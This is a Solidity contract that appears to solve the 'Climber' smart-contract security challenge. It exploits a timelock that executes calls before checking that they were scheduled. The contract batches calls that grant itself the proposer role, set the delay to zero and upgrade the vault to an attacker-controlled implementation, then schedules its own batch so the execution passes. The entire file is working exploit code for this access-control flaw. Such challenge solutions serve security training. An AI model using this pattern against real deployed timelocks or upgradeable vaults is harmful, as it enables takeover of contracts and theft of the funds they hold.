// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {VulnerableClimber} from "./VulnerableClimber.sol";
import {ClimberTimelock} from "./ClimberTimelock.sol";
import {ClimberVault} from "./ClimberVault.sol";

contract CreateSignature {
    VulnerableClimber immutable vulnerableClimber;
    ClimberTimelock immutable timelock;
    ClimberVault immutable vault;

    constructor(address _vulnerableClimber, address payable _timelock, address _vault) {
        vulnerableClimber = VulnerableClimber(_vulnerableClimber);
        timelock = ClimberTimelock(_timelock);
        vault = ClimberVault(_vault);
    }

    function schedule() external {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        // Give contract PROPOSER_ROLE
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(timelock.grantRole.selector, keccak256("PROPOSER_ROLE"), address(this));

        // Set maxDelay to 0
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(timelock.updateDelay.selector, 0);

        // Upgrade vault to the VulnerableClimber
        targets[2] = address(vault);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(vault.upgradeTo.selector, address(vulnerableClimber));

        // Schedule the transaction
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(this.schedule.selector);

        timelock.schedule(targets, values, dataElements, bytes32(0));
    }
}
